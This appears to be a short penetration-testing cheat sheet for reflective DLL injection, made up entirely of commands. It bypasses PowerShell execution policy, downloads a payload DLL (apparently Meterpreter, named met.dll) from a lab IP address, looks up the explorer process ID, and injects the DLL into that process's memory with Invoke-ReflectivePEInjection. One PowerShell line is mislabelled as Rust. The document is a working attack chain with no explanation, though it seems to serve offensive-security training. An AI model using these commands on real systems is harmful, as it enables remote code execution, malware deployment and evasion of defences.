# Reflective DLL Injection

```
PowerShell -Exec Bypass
```

```rust
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll')
```

```
$procid = (Get-Process -Name explorer).Id
```

```powershell
Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
```

```powershell
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```
